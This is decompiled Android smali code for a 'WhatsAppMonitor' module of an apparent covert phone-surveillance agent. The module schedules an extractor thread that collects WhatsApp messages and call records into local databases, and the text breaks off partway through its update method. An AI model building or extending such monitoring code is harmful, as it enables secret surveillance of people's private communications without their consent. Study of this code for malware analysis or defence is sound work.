.class public Lcom/hp/vd/module/monitor/WhatsAppMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "WhatsAppMonitor.java"


# static fields
.field public static final ATTRIBUTE_CALL_MAX_ID:Ljava/lang/String; = "wa_call_max_id"

.field public static final ATTRIBUTE_CALL_MAX_READ_PER_ITERATION:Ljava/lang/String; = "100"

.field public static final ATTRIBUTE_MAX_ID:Ljava/lang/String; = "wa_max_id"

.field public static final ATTRIBUTE_MAX_ID_V12:Ljava/lang/String; = "max_id"

.field public static final ATTRIBUTE_MAX_READ_PER_ITERATION:Ljava/lang/String; = "400"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "wa_synchronization_interval"

.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL_V12:Ljava/lang/String; = "synchronization_interval"

.field protected static final TAG:Ljava/lang/String; = "WhatsAppMonitor"


# instance fields
.field protected extractorThread:Ljava/lang/Thread;

.field protected lastSynchronization:Ljava/lang/Long;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected whatsappCallDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/WhatsAppCallData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected whatsappDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/WhatsAppData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 41
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 55
    iput-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->whatsappDao:Lcom/j256/ormlite/dao/Dao;

    .line 56
    iput-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->whatsappCallDao:Lcom/j256/ormlite/dao/Dao;

    .line 57
    iput-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->extractorThread:Ljava/lang/Thread;

    .line 58
    iput-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 59
    iput-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->lastSynchronization:Ljava/lang/Long;

    return-void
.end method


# virtual methods
.method public deinitialize()Z
    .locals 2

    .line 299
    iget-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->whatsappDao:Lcom/j256/ormlite/dao/Dao;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    .line 300
    iput-object v1, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->whatsappDao:Lcom/j256/ormlite/dao/Dao;

    .line 303
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->whatsappCallDao:Lcom/j256/ormlite/dao/Dao;

    if-eqz v0, :cond_1

    .line 304
    iput-object v1, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->whatsappCallDao:Lcom/j256/ormlite/dao/Dao;

    :cond_1
    const/4 v0, 0x1

    return v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 65
    const-class v0, Lcom/hp/vd/data/WhatsAppData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 100
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 102
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 103
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 104
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 105
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x4

    .line 106
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v4.0"

    .line 107
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data=text;"

    .line 109
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 110
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "wa_max_id=0;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 111
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "wa_call_max_id=0;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 112
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "wa_synchronization_interval=3500;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    const/16 v1, 0xa

    .line 114
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 115
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 117
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "WhatsAppMonitor"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired()Z
    .locals 9

    .line 378
    iget-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->lastSynchronization:Ljava/lang/Long;

    .line 379
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    div-long/2addr v1, v3

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    .line 380
    iget-object v2, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "wa_synchronization_interval"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    if-eqz v0, :cond_0

    .line 382
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    sub-long v7, v3, v5

    int-to-long v2, v2

    cmp-long v0, v7, v2

    if-gez v0, :cond_0

    const/4 v0, 0x1

    return v0

    .line 386
    :cond_0
    iput-object v1, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x0

    return v0
.end method

.method public initialize()Z
    .locals 6

    .line 207
    iget-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const/4 v1, 0x0

    .line 210
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->whatsappDao:Lcom/j256/ormlite/dao/Dao;

    .line 211
    iget-object v2, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    const-class v3, Lcom/hp/vd/data/WhatsAppCallData;

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getDao(Ljava/lang/Class;)Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->whatsappCallDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_1

    .line 225
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 227
    iget-object v2, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "wa_max_id"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_0

    const-string v3, "0"

    .line 229
    invoke-virtual {v2, v3}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v2

    if-nez v2, :cond_6

    :cond_0
    const-string v2, "WhatsAppMonitor"

    const-string v3, "initialize(): maxId is null or 0 which most probably means we are running for the first time. Checking for data from update()"

    .line 230
    invoke-interface {v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 235
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "system"

    .line 237
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v4

    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 235
    invoke-virtual {v2, v3, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    const-string v2, "wa_max_id"

    .line 240
    invoke-interface {v1, v2}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    const-string v2, "wa_max_id"

    const-string v3, "0"

    .line 241
    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 242
    iget-object v3, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "wa_max_id"

    invoke-virtual {v3, v4, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v3, "WhatsAppMonitor"

    .line 244
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Loaded (after update) wa_max_id: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_1
    const-string v2, "wa_synchronization_interval"

    .line 247
    invoke-interface {v1, v2}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_2

    const-string v2, "wa_synchronization_interval"

    const-string v3, "3501"

    .line 248
    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 249
    iget-object v3, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "wa_synchronization_interval"

    invoke-virtual {v3, v4, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v3, "WhatsAppMonitor"

    .line 251
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Loaded (after update) wa_synchronization_interval: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 254
    :cond_2
    iget-object v2, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0, v2}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v2

    if-nez v2, :cond_3

    const-string v1, "WhatsAppMonitor"

    const-string v2, "Could not persist ATTRIBUTE_FIRST_RUN = FALSE."

    const/4 v3, 0x3

    .line 255
    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_0

    .line 269
    :cond_3
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "wa_max_id"

    .line 271
    invoke-interface {v1, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_4

    const-string v3, "wa_max_id"

    .line 272
    invoke-interface {v2, v3}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    :cond_4
    const-string v3, "wa_synchronization_interval"

    .line 275
    invoke-interface {v1, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_5

    const-string v1, "wa_synchronization_interval"

    .line 276
    invoke-interface {v2, v1}, Landroid/content/SharedPreferences$Editor;->remove(Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 279
    :cond_5
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "WhatsAppMonitor"

    const-string v3, "initialize(): could not load persisted module data."

    .line 284
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_6
    :goto_0
    const/4 v0, 0x1

    return v0

    :catch_1
    move-exception v2

    const-string v3, "WhatsAppMonitor"

    const-string v4, "NullPointerException caught while initializing"

    .line 219
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1

    :catch_2
    move-exception v2

    const-string v3, "WhatsAppMonitor"

    const-string v4, "Could not create Daos (msg + calls)."

    .line 214
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method public install(Ljava/lang/String;)Z
    .locals 4

    const/4 v0, 0x0

    .line 76
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getConnectionSource()Lcom/j256/ormlite/support/ConnectionSource;

    move-result-object v1

    .line 78
    const-class v2, Lcom/hp/vd/data/WhatsAppCallData;

    invoke-static {v1, v2}, Lcom/j256/ormlite/table/TableUtils;->createTable(Lcom/j256/ormlite/support/ConnectionSource;Ljava/lang/Class;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 89
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_0

    return v0

    :cond_0
    const/16 p1, 0x96

    .line 93
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    const/4 p1, 0x1

    return p1

    :catch_0
    move-exception p1

    .line 84
    iget-object v1, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "WhatsAppMonitor"

    const-string v3, "install(): exception caught during creating-second level tables"

    invoke-interface {v1, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v0
.end method

.method public isStarted()Z
    .locals 1

    .line 369
    iget-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->extractorThread:Ljava/lang/Thread;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    .line 373
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    return v0
.end method

.method public start()Z
    .locals 8

    .line 323
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v6

    const-string v0, "WhatsAppMonitor"

    const-string v1, "start() called."

    .line 324
    invoke-interface {v6, v0, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 326
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->isActivated()Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_0

    const-string v0, "WhatsAppMonitor"

    const-string v2, "start(): This module is currently DEactivated."

    .line 327
    invoke-interface {v6, v0, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v1

    .line 332
    :cond_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->hasUpdateIntervalExpired()Z

    move-result v0

    const/4 v7, 0x1

    if-ne v0, v7, :cond_1

    return v7

    .line 336
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->extractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    iget-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->isAlive()Z

    move-result v0

    if-eqz v0, :cond_2

    const-string v0, "WhatsAppMonitor"

    const-string v2, "start(): Extractor thread is currently running. Exiting..."

    .line 337
    invoke-interface {v6, v0, v2, v7}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v1

    .line 342
    :cond_2
    new-instance v0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;

    .line 343
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->whatsappDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->whatsappCallDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    move-object v1, v0

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 350
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "WhatsApp-Extractor-Thread"

    invoke-direct {v1, v0, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->extractorThread:Ljava/lang/Thread;

    .line 351
    iget-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return v7
.end method

.method public startOnHeartbeat()Z
    .locals 1

    .line 313
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->isActivated()Z

    move-result v0

    if-nez v0, :cond_0

    const/4 v0, 0x0

    return v0

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 1

    .line 359
    iget-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->extractorThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    .line 360
    iget-object v0, p0, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->extractorThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public update(Lcom/hp/vd/module/IModule;)Z
    .locals 7

    .line 130
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "WhatsAppMonitor"

    const-string v2, "update() called on the new version. About to temporarily save important attributes."

    .line 131
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v1, 0x0

    const/4 v2, 0x3

    .line 136
    :try_start_0
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v3, :cond_0

    const-string p1, "WhatsAppMonitor"

    const-string v3, "The loaded persistedModuleData from the old module == NULL."

    .line 149
    invoke-interface {v0, p1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v1

    .line 158
    :cond_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v4

    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-string v5, "system"

    .line 160
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/WhatsAppMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v6

    invoke-virtual {v6}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 158
    invoke-virtual {v4, v5, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 163
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    .line 168
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v4

    iget-object v4, v4, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v4

    const/4 v5, 0x1

    const/4 v6, 0x0

    if-eq v4, v5, :cond_3

    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v4

    iget-object v4, v4, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v4

    const/4 v5, 0x2

    if-ne v4, v5, :cond_1

    goto :goto_0

    .line 172
    :cond_1
    invoke-interface {p1}, Lcom/hp/vd/module/IModule;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object p1

    iget-object p1, p1, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result p1

    if-ne p1, v2, :cond_2

    const-string p1, "wa_max_id"

    .line 173
    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string p1, "wa_synchronization_interval"

    .line 174
    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    goto :goto_1

    :cond_2
    move-object p1, v6

    goto :goto_1

    :cond_3
    :goto_0
    const-string p1, "max_id"

    .line 169
    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string p1, "synchronization_interval"

    .line 170
    invoke-virtual {v3, p1}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    :goto_1
    if-eqz v6, :cond_4

    const-string v2, "wa_max_id"

    .line 178
    invoke-interface {v1, v2, v6}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    const-string v2, "WhatsAppMonitor"

    .line 183
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "update(): saving va from the previous module: wa_max_id="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

